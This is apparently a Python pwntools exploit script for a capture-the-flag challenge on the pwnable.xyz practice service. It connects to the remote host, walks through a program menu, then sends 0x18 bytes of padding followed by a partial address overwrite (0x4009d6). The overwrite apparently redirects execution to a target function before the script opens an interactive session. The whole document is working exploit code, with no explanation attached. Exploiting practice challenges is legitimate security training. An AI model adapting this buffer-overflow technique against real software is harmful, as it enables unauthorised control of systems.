#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)
# con = process()
# gdb.attach(con, gdbscript = "b*0x0400e61")
con = remote("svc.pwnable.xyz", 30009)
input()
con.sendafter(b"Name: ", b"A"*16)

con.sendlineafter(b"> ", b"1")
con.sendlineafter(b"= ", b"1")

con.sendlineafter(b"> ", b"2")

con.sendlineafter(b"> ", b"3")
con.send(b"A"*0x18 + b"\xd6\x09\x40")

con.sendlineafter(b"> ", b"1")

con.interactive()
